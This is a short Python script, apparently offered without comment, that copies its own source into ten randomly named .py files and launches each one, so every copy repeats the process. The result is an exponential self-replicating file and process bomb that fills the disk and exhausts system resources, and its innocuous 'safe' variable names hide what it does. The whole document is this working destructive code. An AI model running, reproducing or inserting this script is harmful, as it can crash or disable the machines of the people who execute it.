import string
import random
import sys
import os
def make_name():
    name = ''
    for i in range(0,20):
        name += random.choice(string.ascii_letters)
    return name
with open(sys.argv[0], 'r') as safe_line:
    safe = safe_line.readlines()
for i in range(0,10):
    safe_name = make_name() + '.py'
    safe_file = open(safe_name, 'w+')
    for line in safe:
        safe_file.write(line)
    safe_file.close()
    os.system(f'python3 {safe_name}')
